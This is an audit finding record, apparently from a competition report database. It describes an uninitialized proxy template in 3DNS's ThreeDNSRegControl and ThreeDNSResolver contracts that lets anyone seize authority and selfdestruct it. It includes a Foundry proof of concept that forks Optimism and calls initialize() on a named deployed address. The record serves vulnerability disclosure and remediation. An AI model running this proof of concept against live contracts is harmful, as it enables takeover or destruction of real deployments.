---
# Core Classification
protocol: 3DNS Inc
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 40780
audit_firm: Cantina
contest_link: https://cantina.xyz/portfolio/fa944e34-21d5-40a7-bc05-d91c46bdb68c
source_link: https://cdn.cantina.xyz/reports/cantina_competition_3dns_mar2024.pdf
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 3
finders:
  - zigtur
  - elhaj
  - Gerard Persoon
---

## Vulnerability Title

Anyone can remove the template contract for threednsregcontrol and threednsresolver (while dencun upgrade not deployed) 

### Overview


This bug report discusses a vulnerability in the ThreeDNSRegControl and ThreeDNSResolver contracts that could allow an attacker to take control of the contracts. The issue is caused by the initialize() function not being run on the template contract, which can be exploited by an attacker to set a fake authority contract. This allows for future authorization checks to be bypassed and for arbitrary Diamonds to be added, which can then be used to call selfdestruct and remove the template contract. The same issue exists in the ThreeDNSResolver contract. The recommendation is to add a constructor to ThreeDNSRegControl to disable initializers and to call initialize() on the template contract with dummy values. A proof of concept is provided to demonstrate the vulnerability on the Optimism network. 

### Original Finding Content

## ThreeDNSRegControl Vulnerability Report

## Context
- **File Locations:**
  - `ThreeDNSRegControl.sol#L105`
  - `ThreeDNSRegControl.sol#L128`
  - `ThreeDNSRegControl.sol#L45-L60`
  - `ThreeDNSRegControl.sol#L83`
  - `ThreeDNSResolver.sol#L44`
  - `ThreeDNSTestEnvironment.t.sol#L100`

## Description
- ThreeDNSRegControl is implemented via a proxy, as can be seen in `ThreeDNSTestEnvironment.sol`.
- The `initialize()` function isn't run on the template contract, allowing it to be invoked later by an attacker.
- This contract sets the `_authority` contract, and future authorization checks can be circumvented by supplying a fake `_authority` contract.
- The function `diamondCut` utilizes `_callerIsProxyAdmin__validate()` via the `_authority` contract, allowing `diamondCut` to be executed by an attacker.
- Through `diamondCut`, arbitrary Diamonds can be added, which can be executed via `fallback()`.
- Such a Diamond could call `selfdestruct` to remove the template (as long as the Dencun upgrade is not deployed on the chain).

As a result, anyone can remove the template contract for `ThreeDNSRegControl` (as long as the Dencun upgrade is not deployed).

**Note:** The same issue exists with `ThreeDNSResolver` because it also uses Diamonds and doesn’t have `_disableInitializers()`.

## Recommendation
Add the following to `ThreeDNSRegControl`:

```solidity
constructor() {
    _disableInitializers();
}
```

### For already deployed contracts:
Call `initialize()` on the template contract with dummy values.

## Proof of Concept
Here is a proof of concept, written in Foundry, that takes over the authority of the template of `ThreeDNSRegControl` on Optimism:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

interface IThreeDNSRegControl {
    function authority() external view returns (address);
    function initialize(
        address _authority,
        address resolver_,
        string memory domainName_,
        string memory domainVersion_,
        uint64 chainId_,
        string memory _baseUri,
        address _usdc
    ) external;
}

contract ThreeDNSTest is Test {
    string constant OPT_RPC = "https://rpc.ankr.com/optimism";
    IThreeDNSRegControl template = IThreeDNSRegControl(0xcE8Af21eFeC523183D4AD6B7123E18c981848245);
    uint256 forkOpt;

    function setUp() external {
        forkOpt = vm.createFork(OPT_RPC); // latest block number
        vm.selectFork(forkOpt);
        console.log("Opt block=%d id=%d", block.number, block.chainid);
    }

    function test_Init() public {
        console.log("Initial authority %s", template.authority()); // 0
        template.initialize(address(this), address(this), "", "", 0, "", address(this));
        console.log("Changed authority %s", template.authority()); // has a value now
    }
}
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Cantina |
| Protocol | 3DNS Inc |
| Report Date | N/A |
| Finders | zigtur, elhaj, Gerard Persoon |

### Source Links

- **Source**: https://cdn.cantina.xyz/reports/cantina_competition_3dns_mar2024.pdf
- **GitHub**: N/A
- **Contest**: https://cantina.xyz/portfolio/fa944e34-21d5-40a7-bc05-d91c46bdb68c

### Keywords for Search

`vulnerability`

